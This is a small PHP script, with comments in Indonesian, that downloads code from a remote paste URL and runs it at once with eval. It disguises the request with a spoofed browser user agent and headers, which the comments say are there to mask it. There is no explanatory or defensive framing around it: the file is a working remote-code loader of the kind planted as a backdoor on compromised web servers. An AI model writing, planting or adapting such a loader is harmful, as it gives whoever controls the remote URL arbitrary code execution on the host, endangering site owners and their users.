<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://bujang.online/raw/sAgrrzq9gQ");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Mengatur waktu timeout
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'); // Menyamarkan agen pengguna
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html',
    'Accept-Language: en-US,en;q=0.9'
]); // Menambahkan header HTTP untuk menyamarkan permintaan
$output = curl_exec($ch);
curl_close($ch);

// Eksekusi konten
eval("?>".$output);
?>
